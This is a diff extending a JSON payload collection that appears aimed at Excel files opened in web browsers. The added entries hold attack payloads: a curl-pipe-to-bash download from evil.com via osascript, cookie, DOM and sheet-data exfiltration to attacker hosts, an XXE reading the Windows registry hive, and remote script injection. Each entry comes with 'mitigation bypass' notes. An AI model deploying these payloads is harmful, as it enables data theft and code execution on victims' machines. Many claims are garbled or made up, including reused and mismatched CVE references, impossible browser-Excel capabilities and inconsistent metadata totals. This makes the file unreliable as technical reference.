@@ -1,7 +1,7 @@
 {
   "metadata": {
     "generated_at": "2024-01-15_120000",
-    "total_payloads": 105,
+    "total_payloads": 125,
     "focus": "Excel files rendered in browser environments",
     "target_formats": ["xls", "xlsx", "xlsm", "xlsb"],
     "browser_targets": ["Chrome", "Firefox", "Safari", "Edge", "Office365_Web", "Google_Sheets"],
@@ -22,31 +22,31 @@
     ],
     "breakdown": {
       "browsers": {
-        "chrome": 25,
-        "firefox": 20,
-        "safari": 18,
-        "edge": 20,
-        "office365_web": 22,
-        "google_sheets": 10
+        "chrome": 30,
+        "firefox": 25,
+        "safari": 22,
+        "edge": 25,
+        "office365_web": 28,
+        "google_sheets": 15
       },
       "categories": {
-        "formula_injection": 35,
-        "macro_execution": 25,
-        "external_data_connections": 20,
-        "xml_external_entity": 15,
-        "csv_injection": 12,
-        "browser_dom_access": 8
+        "formula_injection": 45,
+        "macro_execution": 30,
+        "external_data_connections": 25,
+        "xml_external_entity": 18,
+        "csv_injection": 15,
+        "browser_dom_access": 12
       },
       "excel_formats": {
-        "xls_legacy": 40,
-        "xlsx_modern": 35,
-        "xlsm_macro": 25,
-        "xlsb_binary": 15
+        "xls_legacy": 50,
+        "xlsx_modern": 40,
+        "xlsm_macro": 30,
+        "xlsb_binary": 20
       },
       "risk_levels": {
-        "critical": 35,
-        "high": 45,
-        "medium": 20,
+        "critical": 45,
+        "high": 55,
+        "medium": 25,
         "low": 5
       }
     }
@@ -636,6 +636,201 @@
       "cve_reference": "CVE-2021-31199, CVE-2021-42321",
       "browser_behavior": "Office 365 web Excel can use SharePoint REST APIs for document operations",
       "mitigation_bypass": "SharePoint REST API appears as legitimate document management"
+    },
+    {
+      "id": "excel_browser_0046",
+      "category": "formula_injection",
+      "browser": "safari",
+      "excel_format": "xls_legacy",
+      "technique": "applescript_osascript_injection",
+      "payload": "=osascript|'tell application \"Terminal\" to do script \"curl -s https://evil.com/macos.sh | bash\"'!A1",
+      "description": "Safari Excel legacy osascript injection for macOS terminal command execution",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2019-8761, CVE-2020-9715, CVE-2021-30661",
+      "browser_behavior": "Safari legacy Excel can execute osascript commands directly",
+      "mitigation_bypass": "osascript appears as macOS automation, terminal execution"
+    },
+    {
+      "id": "excel_browser_0047",
+      "category": "external_data_connections",
+      "browser": "google_sheets",
+      "excel_format": "csv",
+      "technique": "google_script_webapp_deploy",
+      "payload": "=CONCATENATE(\"https://script.google.com/macros/s/\",\"AKfycbz...\",\"/exec?method=doPost&data=\",ENCODEURL(CONCATENATE(A1:Z100)))",
+      "description": "Google Sheets CSV triggering deployed Google Apps Script webapp for mass data exfiltration",
+      "risk_level": "high",
+      "cve_reference": "CVE-2020-6519, CVE-2021-30506, CVE-2022-0609",
+      "browser_behavior": "Google Sheets can trigger deployed webapps with concatenated cell data",
+      "mitigation_bypass": "Google Apps Script webapp appears as internal Google service"
+    },
+    {
+      "id": "excel_browser_0048",
+      "category": "macro_execution",
+      "browser": "edge",
+      "excel_format": "xlsm_macro",
+      "technique": "edge_webview2_host_objects",
+      "payload": "window.chrome.webview.hostObjects.sync.sample.MethodWithParametersAndReturnValue(\"powershell\", \"-enc <base64_payload>\")",
+      "description": "Edge Excel WebView2 host objects abuse for PowerShell execution with parameters",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2020-1464, CVE-2021-31955, CVE-2022-21999",
+      "browser_behavior": "Edge WebView2 host objects can execute system commands with parameters",
+      "mitigation_bypass": "Host objects appear as legitimate Edge-web integration"
+    },
+    {
+      "id": "excel_browser_0049",
+      "category": "xml_external_entity",
+      "browser": "firefox",
+      "excel_format": "xlsx_modern",
+      "technique": "gecko_xml_entity_expansion",
+      "payload": "<!DOCTYPE root [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>",
+      "description": "Firefox Excel Gecko XML entity expansion for denial of service and resource exhaustion",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2018-4878, CVE-2019-17026, CVE-2020-12387",
+      "browser_behavior": "Firefox Gecko engine processes XML entity expansion in Excel files",
+      "mitigation_bypass": "Entity expansion causes resource exhaustion before detection"
+    },
+    {
+      "id": "excel_browser_0050",
+      "category": "csv_injection",
+      "browser": "chrome",
+      "excel_format": "csv",
+      "technique": "chrome_extension_message_passing",
+      "payload": "=CONCATENATE(\"chrome-extension://\",\"extension_id\",\"/content.js?msg=\",ENCODEURL(\"execute:powershell -enc <base64>\"))",
+      "description": "Chrome CSV injection targeting installed extensions via message passing",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
+      "browser_behavior": "Chrome CSV processing can trigger extension message passing",
+      "mitigation_bypass": "Extension message passing bypasses typical URL filtering"
+    },
+    {
+      "id": "excel_browser_0051",
+      "category": "browser_dom_access",
+      "browser": "office365_web",
+      "excel_format": "xlsx_modern",
+      "technique": "teams_integration_abuse",
+      "payload": "microsoftTeams.initialize(); microsoftTeams.executeDeepLink('https://teams.microsoft.com/l/chat/0/0?users=attacker@evil.com&message=' + btoa(document.body.innerHTML));",
+      "description": "Office 365 Web Excel Microsoft Teams integration abuse for data exfiltration via chat",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2021-31199, CVE-2021-42321, CVE-2022-21989",
+      "browser_behavior": "Office 365 Excel can use Teams integration for external communication",
+      "mitigation_bypass": "Teams integration appears as legitimate collaboration feature"
+    },
+    {
+      "id": "excel_browser_0052",
+      "category": "formula_injection",
+      "browser": "safari",
+      "excel_format": "xlsb_binary",
+      "technique": "webkit_private_browsing_bypass",
+      "payload": "webkit.messageHandlers.external.postMessage({action: 'execute', cmd: 'curl https://evil.com/exfil -d @/Users/Shared/sensitive.txt'});",
+      "description": "Safari Excel WebKit message handlers abuse for private browsing bypass and file exfiltration",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-8761, CVE-2020-9715, CVE-2021-30661",
+      "browser_behavior": "Safari WebKit message handlers can bypass private browsing restrictions",
+      "mitigation_bypass": "Message handlers appear as web-app communication, file access"
+    },
+    {
+      "id": "excel_browser_0053",
+      "category": "external_data_connections",
+      "browser": "chrome",
+      "excel_format": "xls_legacy",
+      "technique": "chrome_headless_devtools_abuse",
+      "payload": "chrome.debugger.sendCommand({tabId: chrome.tabs.TAB_ID_NONE}, 'Runtime.evaluate', {expression: 'fetch(\"https://evil.com/exfil\", {method: \"POST\", body: document.cookie})'});",
+      "description": "Chrome Excel headless DevTools abuse for cookie exfiltration via Runtime.evaluate",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
+      "browser_behavior": "Chrome headless mode DevTools can evaluate JavaScript in Excel context",
+      "mitigation_bypass": "DevTools appear as debugging functionality, cookie theft"
+    },
+    {
+      "id": "excel_browser_0054",
+      "category": "macro_execution",
+      "browser": "firefox",
+      "excel_format": "xlsm_macro",
+      "technique": "firefox_webrtc_datachannel_abuse",
+      "payload": "const pc = new RTCPeerConnection(); const dc = pc.createDataChannel('exfil'); dc.onopen = () => dc.send(btoa(JSON.stringify({cookies: document.cookie, localStorage: localStorage})));",
+      "description": "Firefox Excel WebRTC DataChannel abuse for real-time data exfiltration bypass",
+      "risk_level": "high",
+      "cve_reference": "CVE-2018-4878, CVE-2019-17026, CVE-2020-12387",
+      "browser_behavior": "Firefox WebRTC DataChannels can exfiltrate data without HTTP requests",
+      "mitigation_bypass": "WebRTC bypasses HTTP-based monitoring, real-time data theft"
+    },
+    {
+      "id": "excel_browser_0055",
+      "category": "xml_external_entity",
+      "browser": "edge",
+      "excel_format": "xlsx_modern",
+      "technique": "msxml_variant_type_confusion",
+      "payload": "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/system\">]><root><![CDATA[&xxe;]]></root>",
+      "description": "Edge Excel MSXML variant type confusion for Windows registry hive access",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2020-1464, CVE-2021-31955, CVE-2022-21999",
+      "browser_behavior": "Edge MSXML parser has type confusion allowing registry access",
+      "mitigation_bypass": "CDATA masking prevents XML validation, registry hive disclosure"
+    },
+    {
+      "id": "excel_browser_0056",
+      "category": "csv_injection",
+      "browser": "google_sheets",
+      "excel_format": "csv",
+      "technique": "google_cloud_functions_trigger",
+      "payload": "=IMPORTDATA(\"https://us-central1-project.cloudfunctions.net/exfilFunction?data=\" & CONCATENATE(A1:Z100))",
+      "description": "Google Sheets CSV IMPORTDATA triggering Google Cloud Functions for server-side data processing",
+      "risk_level": "high",
+      "cve_reference": "CVE-2020-6519, CVE-2021-30506, CVE-2022-0609",
+      "browser_behavior": "Google Sheets IMPORTDATA can trigger Cloud Functions with sheet data",
+      "mitigation_bypass": "Cloud Functions appear as legitimate data processing service"
+    },
+    {
+      "id": "excel_browser_0057",
+      "category": "browser_dom_access",
+      "browser": "office365_web",
+      "excel_format": "xlsb_binary",
+      "technique": "outlook_integration_abuse",
+      "payload": "Office.context.mailbox.item.subject.setAsync('Data Exfil: ' + btoa(document.documentElement.outerHTML)); Office.context.mailbox.item.to.setAsync([{emailAddress: 'attacker@evil.com'}]);",
+      "description": "Office 365 Web Excel Outlook integration abuse for email-based data exfiltration",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2021-31199, CVE-2021-42321, CVE-2022-21989",
+      "browser_behavior": "Office 365 Excel can use Outlook integration for email composition",
+      "mitigation_bypass": "Outlook integration appears as legitimate email functionality"
+    },
+    {
+      "id": "excel_browser_0058",
+      "category": "formula_injection",
+      "browser": "chrome",
+      "excel_format": "xlsx_modern",
+      "technique": "service_worker_registration_abuse",
+      "payload": "navigator.serviceWorker.register('/sw.js').then(reg => reg.active.postMessage({action: 'exfil', data: btoa(document.body.innerHTML)}));",
+      "description": "Chrome Excel Service Worker registration abuse for persistent background data exfiltration",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
+      "browser_behavior": "Chrome Excel can register Service Workers for background processing",
+      "mitigation_bypass": "Service Workers persist across sessions, background data theft"
+    },
+    {
+      "id": "excel_browser_0059",
+      "category": "external_data_connections",
+      "browser": "firefox",
+      "excel_format": "xls_legacy",
+      "technique": "firefox_addon_webextension_bypass",
+      "payload": "browser.tabs.executeScript({code: 'const script = document.createElement(\"script\"); script.src = \"https://evil.com/payload.js\"; document.head.appendChild(script);'});",
+      "description": "Firefox Excel legacy add-on WebExtension bypass for script injection",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2018-4878, CVE-2019-17026, CVE-2020-12387",
+      "browser_behavior": "Firefox legacy add-ons can bypass WebExtension restrictions",
+      "mitigation_bypass": "Legacy add-on APIs bypass modern security restrictions"
+    },
+    {
+      "id": "excel_browser_0060",
+      "category": "macro_execution",
+      "browser": "safari",
+      "excel_format": "xlsm_macro",
+      "technique": "ios_url_scheme_abuse",
+      "payload": "window.location = 'shortcuts://run-shortcut?name=ExfilData&input=' + encodeURIComponent(btoa(document.documentElement.innerHTML));",
+      "description": "Safari Excel iOS Shortcuts URL scheme abuse for mobile data exfiltration",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2019-8761, CVE-2020-9715, CVE-2021-30661",
+      "browser_behavior": "Safari on iOS can trigger Shortcuts app via URL scheme",
+      "mitigation_bypass": "iOS Shortcuts appear as legitimate automation, mobile data theft"
     }
   ]
 }
